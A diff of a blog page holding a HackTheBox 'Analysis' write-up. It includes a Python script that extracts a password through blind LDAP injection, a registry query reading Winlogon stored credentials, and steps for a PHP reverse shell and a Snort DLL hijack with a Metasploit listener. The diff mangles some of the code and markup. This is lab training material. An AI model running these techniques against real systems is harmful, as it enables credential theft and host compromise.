@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Analysis-Windows-Hard</h1>
   
@@ -74,207 +66,204 @@
 </aside>
 
 <h2 id="1-enumeration">1: Enumeration</h2>
-
+<p><br /><br /></p>
 <ul>
-  <li>nmap scanning</li>
+  <li>nmap scanning
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled.png" alt="Untitled" />
+<br /><br />
+We found a http service on 80 port 
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_1.png" alt="Untitled" />
+<br /><br />
+Use gobuster to look for any subdomain
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_2.png" alt="Untitled" />
+<br /><br />
+internal subdomain may be interesting
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_3.png" alt="Untitled" />
+<br /><br />
+We use a FUZZ tool for search a directory (Let’s dig into employees)
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_4.png" alt="Untitled" />
+<br /><br />
+We found something interesting
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_5.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_6.png" alt="Untitled" />
+<br /><br />
+it’d be possible to make requests? Let’s see users dir
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_7.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_8.png" alt="Untitled" />
+<br /><br />
+vulnerable to ldpa injection Use a payload
+<br /><br />
+```bash
+import argparse
+import requests
+import urllib.parse</li>
 </ul>
 
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled.png" alt="Untitled" /></p>
-
-<p>We found a http service on 80 port</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_1.png" alt="Untitled" /></p>
-
-<p>Use gobuster to look for any subdomain</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_2.png" alt="Untitled" /></p>
-
-<p>internal subdomain may be interesting</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_3.png" alt="Untitled" /></p>
-
-<p>We use a FUZZ tool for search a directory (Let’s dig into employees)</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_4.png" alt="Untitled" /></p>
-
-<p>We found something interesting</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_5.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_6.png" alt="Untitled" /></p>
-
-<p>it’d be possible to make requests? Let’s see users dir</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_7.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_8.png" alt="Untitled" /></p>
-
-<p>vulnerable to ldpa injection Use a payload</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import argparse
-import requests
-import urllib.parse
-
-def main<span class="o">()</span>:
-    charset_path <span class="o">=</span> <span class="s2">"/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"</span>
-    base_url <span class="o">=</span> <span class="s2">"http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"</span>
-    found_chars <span class="o">=</span> <span class="s2">""</span>
-    skip_count <span class="o">=</span> 6
-    add_star <span class="o">=</span> True
-    with open<span class="o">(</span>charset_path, <span class="s1">'r'</span><span class="o">)</span> as file:
-        <span class="k">for </span>char <span class="k">in </span>file:
-            char <span class="o">=</span> char.strip<span class="o">()</span>
-            <span class="c"># URL encode the character</span>
-            char_encoded <span class="o">=</span> urllib.parse.quote<span class="o">(</span>char<span class="o">)</span>
-            <span class="c"># Check if '*' is found and skip the first 6 '*' characters</span>
-            <span class="k">if</span> <span class="s1">'*'</span> <span class="k">in </span>char and skip_count <span class="o">&gt;</span> 0:
-                skip_count -<span class="o">=</span> 1
-                <span class="k">continue</span>
-            <span class="c"># Add '*' after encountering it for the first time</span>
-            <span class="k">if</span> <span class="s1">'*'</span> <span class="k">in </span>char and add_star:
-                found_chars +<span class="o">=</span> char
-                print<span class="o">(</span>f<span class="s2">"[+] Found Password: {found_chars}"</span><span class="o">)</span>
-                add_star <span class="o">=</span> False
-                <span class="k">continue
-            </span>modified_url <span class="o">=</span> base_url.replace<span class="o">(</span><span class="s2">"{FUZZ}"</span>, char_encoded<span class="o">)</span>.replace<span class="o">(</span><span class="s2">"{found_char}"</span>, found_chars<span class="o">)</span>
-            response <span class="o">=</span> requests.get<span class="o">(</span>modified_url<span class="o">)</span>
-            <span class="k">if</span> <span class="s2">"technician"</span> <span class="k">in </span>response.text and response.status_code <span class="o">==</span> 200:
-                found_chars +<span class="o">=</span> char
-                print<span class="o">(</span>f<span class="s2">"[+] Found Password: {found_chars}"</span><span class="o">)</span>
-                file.seek<span class="o">(</span>0, 0<span class="o">)</span>
-<span class="k">if </span>__name__ <span class="o">==</span> <span class="s2">"__main__"</span>:
-    main<span class="o">()</span>
+<p>def main():
+    charset_path = “/usr/share/seclists/Fuzzing/alphanum-case-extra.txt”
+    base_url = “http://internal.analysis.htb/users/list.php?name=<em>)(%26(objectClass=user)(description={found_char}{FUZZ}</em>)”
+    found_chars = “”
+    skip_count = 6
+    add_star = True
+    with open(charset_path, ‘r’) as file:
+        for char in file:
+            char = char.strip()
+            # URL encode the character
+            char_encoded = urllib.parse.quote(char)
+            # Check if ‘<em>’ is found and skip the first 6 ‘</em>’ characters
+            if ‘<em>’ in char and skip_count &gt; 0:
+                skip_count -= 1
+                continue
+            # Add ‘</em>’ after encountering it for the first time
+            if ‘*’ in char and add_star:
+                found_chars += char
+                print(f”[+] Found Password: {found_chars}”)
+                add_star = False
+                continue
+            modified_url = base_url.replace(“{FUZZ}”, char_encoded).replace(“{found_char}”, found_chars)
+            response = requests.get(modified_url)
+            if “technician” in response.text and response.status_code == 200:
+                found_chars += char
+                print(f”[+] Found Password: {found_chars}”)
+                file.seek(0, 0)
+if <strong>name</strong> == “<strong>main</strong>”:
+    main()</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br/&gt;&lt;br/&gt;
+- **Logic**
+    1. Base URL definition: The base URL is defined as "[http://internal.analysis.htb/users/list.php?name=*](http://internal.analysis.htb/users/list.php?name=*))(%26(objectClass=user)(description={found_char}{FUZZ} *)". This URL includes a placeholder {FUZZ} that will be replaced by each character in the character file and another placeholder {found_char} that will be replaced with the characters found during the fuzzing process.
+    &lt;br/&gt;&lt;br/&gt;
+    2. Reading the character file: The character file defined in charset_path is opened and iterated over each line of the file. Each line contains a character that will be used to make requests to the URL.
+    &lt;br/&gt;&lt;br/&gt;
+    3. URL Modification: For each character in the character file, the character is encoded and the {FUZZ} placeholder in the base URL is replaced with this encoded character
+    &lt;br/&gt;&lt;br/&gt;
+    4. Sending HTTP Requests: An HTTP GET request is sent to the modified URL for each character in the character file.
+    &lt;br/&gt;&lt;br/&gt;
+    5. **Response verification: It is checked if the response contains the string "technician" and if the response status code is 200 (OK). If both conditions are met, the character is considered part of the password.**
+    &lt;br/&gt;&lt;br/&gt;
+    6. Update found password: If a character is found that appears to be part of the password, it is added to the variable found_chars, which contains the password found so far.
+    &lt;br/&gt;&lt;br/&gt;
+    7. Printing the password found: The password found so far is printed each time a new character is found that appears to be part of the password.
+    &lt;br/&gt;&lt;br/&gt;
+    8. Repetition of the process: The process continues until the complete password is found or the entire character set of the file has been scanned.
+&lt;br/&gt;&lt;br/&gt;
+    In the code provided there is no explicit logic to determine the order of the characters in the password. The password is out of order due to the fuzzing process being carried out.
+&lt;br/&gt;&lt;br/&gt;
+![Untitled](/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_9.png)
+&lt;br/&gt;&lt;br/&gt;
+## 2: User flag
+&lt;br/&gt;&lt;br/&gt;
+We into log in page we saw before
+&lt;br/&gt;&lt;br/&gt;
+![Untitled](/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_10.png)
+&lt;br/&gt;&lt;br/&gt;
+Send a php rev shell and get access as svc_web
+&lt;br/&gt;&lt;br/&gt;
+![Untitled](/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_11.png)
+&lt;br/&gt;&lt;br/&gt;
+![Untitled](/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_12.png)
+&lt;br/&gt;&lt;br/&gt;
+Looking for creds on logon config
+&lt;br/&gt;&lt;br/&gt;
+```bash
+reg query "HKEY_LOCAL_MACHINE\software\Microsoft\Windows NT\Currentversion\Winlogon"
 </code></pre></div></div>
-
+<p><br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_13.png" alt="Untitled" />
+<br /><br />
+Evilwinrm port is open we can try
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_14.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_15.png" alt="Untitled" />
+<br /><br /></p>
+<h2 id="3-priv-esc">3: Priv esc</h2>
+<p><br /><br /></p>
+<h3 id="privesc-cve-2016-1417">Privesc CVE-2016-1417</h3>
+<p><br /><br />
+Even when we haven’t the same vulnerability here this one is really similar and the vector attack is almos the same.
+<br /><br /></p>
 <ul>
-  <li><strong>Logic</strong>
+  <li>• The vulnerability exists due to an untrusted search path vulnerability. This means the software relies on a search path that can be controlled by an attacker.
+<br /><br /></li>
+  <li>• Attackers can exploit this by placing a malicious DLL file (e.g., ”tcapi.dll”) in the same directory as a PCAP file being processed by Snort.
+<br /><br /></li>
+  <li>• When Snort tries to load libraries associated with the PCAP file, it might load the attacker’s malicious DLL instead of the legitimate one, leading to code execution and potential system compromise.
+<br /><br />
+Using linpeas we found there is a possible dll hijacking on 
+<br /><br />
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\S</span>nort<span class="se">\b</span><span class="k">in</span><span class="se">\s</span>nort.exe
+</code></pre></div>    </div>
+    <p><br /><br />
+Check permissions
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_16.png" alt="Untitled" />
+<br /><br />
+First i tried to using this
+<br /><br />
+—
+<br /><br /></p>
     <ol>
-      <li>Base URL definition: The base URL is defined as “[http://internal.analysis.htb/users/list.php?name=<em>](http://internal.analysis.htb/users/list.php?name=</em>))(%26(objectClass=user)(description={found_char}{FUZZ} *)”. This URL includes a placeholder {FUZZ} that will be replaced by each character in the character file and another placeholder {found_char} that will be replaced with the characters found during the fuzzing process.</li>
-      <li>Reading the character file: The character file defined in charset_path is opened and iterated over each line of the file. Each line contains a character that will be used to make requests to the URL.</li>
-      <li>URL Modification: For each character in the character file, the character is encoded and the {FUZZ} placeholder in the base URL is replaced with this encoded character</li>
-      <li>Sending HTTP Requests: An HTTP GET request is sent to the modified URL for each character in the character file.</li>
-      <li><strong>Response verification: It is checked if the response contains the string “technician” and if the response status code is 200 (OK). If both conditions are met, the character is considered part of the password.</strong></li>
-      <li>Update found password: If a character is found that appears to be part of the password, it is added to the variable found_chars, which contains the password found so far.</li>
-      <li>Printing the password found: The password found so far is printed each time a new character is found that appears to be part of the password.</li>
-      <li>Repetition of the process: The process continues until the complete password is found or the entire character set of the file has been scanned.</li>
+      <li>Create a evil dll
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_17.png" alt="Untitled" />
+<br /><br /></li>
+      <li>set metasploit to receive connection
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_18.png" alt="Untitled" />
+<br /><br /></li>
+      <li>Upload evil dll
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_19.png" alt="Untitled" />
+<br /><br />
+The problem was i was using a generic payload and it didn’t match with the generated msfvenom payload 
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_20.png" alt="Untitled" />
+<br /><br />
+—
+<br /><br />
+but using default payloads it didn’t work, so after a research i found a better and easy one:
+<br /><br /></li>
+      <li>Make a evil dll
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_21.png" alt="Untitled" />
+<br /><br /></li>
+      <li>Use metasploit to get connection 
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_22.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_23.png" alt="Untitled" />
+<br /><br /></li>
+      <li>Upload the evil dll
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_24.png" alt="Untitled" />
+<br /><br /></li>
+      <li>Machine pwned!!!
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" />
+<br /><br />
+<a href="https://www.notion.so">https://www.notion.so</a>
+<script src="/assets/js/matrix-overlay.js"></script></li>
     </ol>
-
-    <p>In the code provided there is no explicit logic to determine the order of the characters in the password. The password is out of order due to the fuzzing process being carried out.</p>
   </li>
 </ul>
 
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_9.png" alt="Untitled" /></p>
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
 
-<h2 id="2-user-flag">2: User flag</h2>
-
-<p>We into log in page we saw before</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_10.png" alt="Untitled" /></p>
-
-<p>Send a php rev shell and get access as svc_web</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_11.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_12.png" alt="Untitled" /></p>
-
-<p>Looking for creds on logon config</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query <span class="s2">"HKEY_LOCAL_MACHINE</span><span class="se">\s</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows NT</span><span class="se">\C</span><span class="s2">urrentversion</span><span class="se">\W</span><span class="s2">inlogon"</span>
-</code></pre></div></div>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_13.png" alt="Untitled" /></p>
-
-<p>Evilwinrm port is open we can try</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_14.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_15.png" alt="Untitled" /></p>
-
-<h2 id="3-priv-esc">3: Priv esc</h2>
-
-<h3 id="privesc-cve-2016-1417">Privesc CVE-2016-1417</h3>
-
-<p>Even when we haven’t the same vulnerability here this one is really similar and the vector attack is almos the same.</p>
-
-<ul>
-  <li>• The vulnerability exists due to an untrusted search path vulnerability. This means the software relies on a search path that can be controlled by an attacker.</li>
-  <li>• Attackers can exploit this by placing a malicious DLL file (e.g., ”tcapi.dll”) in the same directory as a PCAP file being processed by Snort.</li>
-  <li>• When Snort tries to load libraries associated with the PCAP file, it might load the attacker’s malicious DLL instead of the legitimate one, leading to code execution and potential system compromise.</li>
-</ul>
-
-<p>Using linpeas we found there is a possible dll hijacking on</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\S</span>nort<span class="se">\b</span><span class="k">in</span><span class="se">\s</span>nort.exe
-</code></pre></div></div>
-
-<p>Check permissions</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_16.png" alt="Untitled" /></p>
-
-<p>First i tried to using this</p>
-
-<hr />
-
-<ol>
-  <li>Create a evil dll</li>
-</ol>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_17.png" alt="Untitled" /></p>
-
-<ol>
-  <li>set metasploit to receive connection</li>
-</ol>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_18.png" alt="Untitled" /></p>
-
-<ol>
-  <li>Upload evil dll</li>
-</ol>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_19.png" alt="Untitled" /></p>
-
-<p>The problem was i was using a generic payload and it didn’t match with the generated msfvenom payload</p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_20.png" alt="Untitled" /></p>
-
-<hr />
-
-<p>but using default payloads it didn’t work, so after a research i found a better and easy one:</p>
-
-<ol>
-  <li>Make a evil dll</li>
-</ol>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_21.png" alt="Untitled" /></p>
-
-<ol>
-  <li>Use metasploit to get connection</li>
-</ol>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_22.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_23.png" alt="Untitled" /></p>
-
-<ol>
-  <li>Upload the evil dll</li>
-</ol>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_24.png" alt="Untitled" /></p>
-
-<ol>
-  <li>Machine pwned!!!</li>
-</ol>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8/9226700b-b281-4728-ad57-f5e7b51b915e-export-bfd6b329-d7cc-4c0a-99ab-2ce408a428a8_Untitled_25.png" alt="Untitled" /></p>
-
-<p><a href="https://www.notion.so">https://www.notion.so</a>
-<script src="/assets/js/matrix-overlay.js"></script></p>
 
 </div>
 
